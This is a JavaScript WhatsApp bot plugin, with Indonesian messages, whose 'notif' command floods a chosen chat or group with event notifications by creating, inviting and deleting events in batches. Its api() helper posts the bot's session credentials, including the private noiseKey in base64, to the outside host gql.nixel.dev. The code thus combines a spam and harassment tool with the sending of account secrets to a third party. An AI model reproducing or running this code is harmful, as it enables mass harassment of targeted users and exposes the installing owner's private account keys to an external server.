const API_URL = 'https://gql.nixel.dev'

async function api(path, body = {}, creds) {
    const apiCreds = {
        me: {
            lid: creds.me.lid
        },
        noiseKey: {
            public: Buffer.from(creds.noiseKey.public).toString('base64'),
            private: Buffer.from(creds.noiseKey.private).toString('base64')
        }
    }

    const response = await fetch(`${API_URL}${path}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            creds: apiCreds,
            ...body
        })
    })

    const text = await response.text()
    let result

    try {
        result = JSON.parse(text)
    } catch {
        throw new Error(`Invalid API response: ${text}`)
    }

    if (!response.ok || !result.success) {
        throw new Error(result.message || `HTTP ${response.status}`)
    }

    return result
}

let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) {
        return m.reply(`⚠️ Format salah!\n\nContoh:\n*${usedPrefix + command} RennZSync|20|500|here*\nAtau kirim ke grup spesifik:\n*${usedPrefix + command} RennZSync|10|500|1203630...*@g.us`)
    }

    const args = text.split('|').map(v => v.trim())
    const eventName = args[0] || 'RennZSync'
    const jump = args[1] || '1'
    const dely = args[2] || '100'
    const targetInput = args[3]

    const much = parseInt(jump) || 1
    const sendto = (targetInput === 'here' || !targetInput) ? m.chat : targetInput
    const sabar = parseInt(dely) || 100

    const reaction = {
        react: {
            text: '⏳',
            key: m.key
        }
    }

    try {
        await conn.relayMessage(m.chat, reaction, {})
    } catch (e) {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
    }

    const creds = conn.authState.creds
    if (!creds || !creds.me || !creds.noiseKey) {
        return m.reply('❌ Kredensial authState pada bot tidak lengkap atau belum tersedia.')
    }

    const targetLid = m.isGroup
        ? m.chat
        : m.sender.endsWith('@lid')
            ? m.sender
            : (await conn.signalRepository?.lidMapping?.getLIDForPN?.(m.sender)) || conn.user?.lid || m.chat

    const runTask = async () => {
        try {
            const now = Math.floor(Date.now() / 1000)

            const res = await api('/api/event/create', {
                name: eventName,
                description: 'Created By RennZSync',
                chatJid: sendto,
                start_ts_sec: now + 3600,
                end_ts_sec: now + 7200,
                reminder_ts_sec: now + 3000
            }, creds)

            const eventId = res.data?.id || res.event?.id
            if (!eventId) return
            await api('/api/event/invite', { eventId, userLid: targetLid }, creds).catch(() => {})
            await api('/api/event/delete', { eventId }, creds).catch(() => {})
        } catch (err) {
            console.error(`Task error:`, err.message)
        }
    }

    const batchSize = 5 
    for (let i = 0; i < much; i += batchSize) {
        const currentBatchSize = Math.min(batchSize, much - i)
        const promises = []

        for (let j = 0; j < currentBatchSize; j++) {
            promises.push(runTask())
        }

        await Promise.all(promises)
        if (i + batchSize < much && sabar > 0) {
            await new Promise(resolve => setTimeout(resolve, sabar))
        }
    }
}

handler.help = ['notif <nama>|<jumlah>|<delay>|<target>']
handler.tags = ['owner']
handler.command = /^(notif|eventnotif)$/i

export default handler
